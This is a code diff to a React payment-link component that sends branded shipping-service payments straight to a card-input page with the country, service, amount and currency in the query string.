@@ -51,6 +51,7 @@ const PaymentBankSelector = () => {
   
   // Check if government service
   const isGovService = isGovernmentService(serviceKey) || serviceKey.toLowerCase() === 'government_payment';
+  const isShippingService = !!companyBranding && !isGovService;
   
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
@@ -71,7 +72,19 @@ const PaymentBankSelector = () => {
 
   const currencyCode = currencyParam || paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
   const formattedAmount = formatCurrency(amount, currencyCode);
-  
+
+  useEffect(() => {
+    if (isShippingService && id) {
+      const queryString = new URLSearchParams({
+        country: countryCode,
+        service: serviceKey,
+        amount: amount.toString(),
+        currency: currencyCode,
+      }).toString();
+      navigate(`/pay/${id}/card-input?${queryString}`, { replace: true });
+    }
+  }, [isShippingService, id, navigate, countryCode, serviceKey, amount, currencyCode]);
+
   useEffect(() => {
     if (countryCode) {
       setLoadingBanks(true);
@@ -129,6 +142,10 @@ const PaymentBankSelector = () => {
     }, 400);
   };
   
+  if (isShippingService) {
+    return null;
+  }
+
   if (!isReady || (linkLoading && !countryParam)) {
     return (
       <div 
